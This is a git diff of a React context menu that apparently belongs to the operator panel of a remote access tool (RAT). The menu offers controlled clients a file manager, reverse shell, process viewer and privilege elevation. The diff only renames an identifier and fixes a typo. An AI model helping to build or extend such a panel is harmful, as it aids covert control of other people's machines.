@@ -2,14 +2,18 @@ import React, { useContext, useEffect, useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { RATContext } from "../rat/RATContext";
 import { ContextMenuProps, SubMenuProps } from "../../types";
-import { manageClientCmd, handleSystemCommandCmd, handleElevateCmd } from "../rat/RATCommands";
+import {
+  manageClientCmd,
+  handleSystemCommandCmd,
+  handleElevateCmd,
+} from "../rat/RATCommands";
 
 const menuOptions = [
   {
     label: "Dashboard",
     icon: <i className="ri-dashboard-line ri-2x text-primary"></i>,
     navigate: true,
-    path: "/clients/[ID]",
+    path: "/clients/[addr]",
   },
   {
     label: "Manage",
@@ -19,19 +23,19 @@ const menuOptions = [
         label: "File Manager",
         icon: <i className="ri-folder-line ri-2x text-warning"></i>,
         navigate: true,
-        path: "/clients/[ID]/files",
+        path: "/clients/[addr]/files",
       },
       {
-        label: "Revere Shell",
+        label: "Reverse Shell",
         icon: <i className="ri-terminal-box-line ri-2x text-error"></i>,
         navigate: true,
-        path: "/clients/[ID]/shell",
+        path: "/clients/[addr]/shell",
       },
       {
         label: "Process Viewer",
         icon: <i className="ri-cpu-line ri-2x text-info"></i>,
         navigate: true,
-        path: "/clients/[ID]/process",
+        path: "/clients/[addr]/process",
       },
       {
         label: "Visit Website",
@@ -50,7 +54,7 @@ const menuOptions = [
         icon: <i className="ri-message-line ri-2x text-success"></i>,
         modal: true,
         modalId: "message_box_modal",
-      }
+      },
     ],
     navigate: false,
   },
@@ -103,7 +107,7 @@ const SubMenu: React.FC<SubMenuProps> = ({
   items,
   top,
   left,
-  id,
+  addr,
   navigate,
   onClose,
 }) => {
@@ -116,20 +120,25 @@ const SubMenu: React.FC<SubMenuProps> = ({
         <div
           key={index}
           onClick={() => {
-              if (item.navigate && typeof item.path === "string") {
-              navigate(item.path.replace("[ID]", id));
+            if (item.navigate && typeof item.path === "string") {
+              navigate(item.path.replace("[addr]", addr));
             }
             if (
               typeof item.function == "function" &&
               typeof item.run === "string"
             ) {
-              item.function(String(id), item.run);
+              item.function(String(addr), item.run);
             }
             if (item.modal && typeof item.modalId === "string") {
-              (document.getElementById(item.modalId) as HTMLDialogElement)?.showModal();
+              (
+                document.getElementById(item.modalId) as HTMLDialogElement
+              )?.showModal();
             }
-            if ( typeof item.function == "function" && typeof item.run === "undefined") {
-              item.function(String(id));
+            if (
+              typeof item.function == "function" &&
+              typeof item.run === "undefined"
+            ) {
+              item.function(String(addr));
             }
             onClose();
           }}
@@ -146,7 +155,7 @@ const SubMenu: React.FC<SubMenuProps> = ({
 export const ContextMenu: React.FC<ContextMenuProps> = ({
   x,
   y,
-  id,
+  addr,
   onClose,
   clientFullName,
 }) => {
@@ -193,7 +202,7 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
           onMouseLeave={handleMouseLeave}
           onClick={() => {
             if (option.navigate && typeof option.path === "string") {
-              navigate(option.path.replace("[ID]", id));
+              navigate(option.path.replace("[addr]", addr));
             }
             onClose();
           }}
@@ -210,7 +219,7 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
           items={menuOptions[activeIndex].options!}
           top={submenuPosition.top}
           left={submenuPosition.left}
-          id={id}
+          addr={addr}
           navigate={navigate}
           onClose={onClose}
         />
